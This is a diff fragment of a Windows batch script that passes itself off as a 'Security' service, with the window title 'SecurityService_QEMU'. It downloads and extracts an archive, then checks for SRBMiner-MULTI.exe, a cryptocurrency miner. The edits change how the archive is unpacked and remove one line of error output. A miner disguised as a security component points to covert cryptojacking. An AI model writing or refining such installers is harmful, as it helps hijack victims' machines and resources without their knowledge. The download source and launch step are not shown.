@@ -19,7 +19,7 @@ set FLAG=%BASE%\security_downloaded.flag
 set WINTITLE=SecurityService_QEMU
 
 REM =========================
-REM DOWNLOAD ONCE
+REM DOWNLOAD ONCE (CURL)
 REM =========================
 
 if exist "%FLAG%" goto SKIP_DOWNLOAD
@@ -36,9 +36,9 @@ if not exist "%ZIP%" goto FAIL
 echo [Security] Extracting...
 
 if exist "%EXTRACT%" rmdir /s /q "%EXTRACT%"
-mkdir "%EXTRACT%" || goto FAIL
 
-tar -xf "%ZIP%" -C "%BASE%"
+powershell -NoProfile -Command ^
+ "Expand-Archive -Force '%ZIP%' '%BASE%'"
 if errorlevel 1 goto FAIL
 
 if not exist "%EXTRACT%\SRBMiner-MULTI.exe" goto FAIL
@@ -57,7 +57,6 @@ goto SKIP_DOWNLOAD
 echo.
 echo ===== ERROR =====
 echo Download or extract failed.
-echo CMD will stay open.
 echo =================
 pause
 
